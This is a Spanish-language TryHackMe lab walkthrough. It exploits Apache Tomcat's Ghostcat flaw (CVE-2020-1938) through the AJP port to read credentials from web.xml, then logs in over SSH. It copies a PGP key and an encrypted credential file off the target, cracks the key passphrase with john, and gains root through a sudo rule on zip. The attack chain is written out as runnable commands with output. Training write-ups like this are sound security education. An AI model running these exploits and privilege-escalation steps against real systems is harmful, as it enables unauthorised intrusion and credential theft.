Bienvenidos a otra sala de tryhackme. Como siempre, escaneamos puerto abiertos con nuestra herramienta nmap, buscaremos la vulnerabilidad del servicio y la version por internet. Luego, nos copiamos el codigo y explotamos el servidor web obteniedo las credenciales del usuario para que establezcamos una conexion ssh. Nos moveremos entre usuarios y finalmente escalamos privilegios a usuario raiz root con `zip`

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-10 09:36:24 EDT for 25s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped syn-ack ttl 63
8009/tcp open  ajp13      syn-ack ttl 63 Apache Jserv (Protocol v1.3)
8080/tcp open  http       syn-ack ttl 63 Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo nos muestra 4 puertos abiertos.  Como no tendremos conexion en los puertos http. Tenemos que buscar una vulnerabilidad para **Apache Tomcat**.
Podes buscar por `exploit apache tomcat 9.0.30` en internet.

Yo utizare este repositorio, que incluye un script en python. Tendremos que indicarle IPTARGET, lo que querramos leer y el puerto.
https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md

Copiamos el exploit y lo pasamos a nuestra maquina atacante. Lo ejecutamos de la siguiente manera y nos dara una respuesta tipo `curl` que nos mostrara la respuesta del servidor web. Obtendremos las credenciales del usuario para establecer una conexion ssh.

```bash
python2 exploit.py IPTARGET -p 8009 -f WEB-INF/web.xml

<display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:'REDACTED'
  </description>
```

# Intrusion

Establecemos conexion ssh al usuario.

```bash
ssh skyfuck@IPTARGET
```

Listamos el directorio,  vemos que hay un archivo .pgp del cual lo transferimos con scp a nuestra maquina atacante para importarlo, descifrarlo y obtener las credenciales del otro usuario que veremos a continuacion.

```bash
# Listamos usuarios dentro del sistema
cat /etc/passwd
merlin:x:1000:1000:zrimga,,,:/home/merlin:/bin/bash
skyfuck:x:1002:1002:tryhackme TRIAL /home/skyfuck:/bin/bash

# Listamos directorio actual
ls -lah
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3.7K Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4.0K Jul 10 07:25 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5.1K Mar 10  2020 tryhackme.asc

# Transferimos archivos que nos interesan desde nuestra maquina atacante
scp skyfuck@IPTARGET:/home/skyfuck/* .
skyfuck@IPTARGET's password: 
credential.pgp
tryhackme.asc 
```

## Merlin

Nos movemos entre usuarios. Primero, tendremos que importar y crackear las credenciales de merlin. Estos dos archivos que obtuvimos, se pueden descifrar utilizando john, luego tendremos que importar el contenido .asc utilizando gpg, que nos pedira una key, y por ultimo decryptarlo tambien con gpg. 

```bash
# Crackeamos 
gpg2john tryhackme.asc > hash.txt
john --wordlist=/Path/Wordlist hash.txt

# Importamos y Decryptamos
gpg --import tryhackme.asc # Nos pedira la key anterior
gpg --decrypt credentials.pgp
```

Establecemos una conexion ssh a merlin.

```bash
ssh merlin@IPTARGET
```

# Priv.Escalation

LIstaremos permisos de superusuario y escalaremos privilegios con `zip`

```bash
sudo -l
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip


TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

```

Informacion obtenida https://gtfobins.github.io/gtfobins/zip/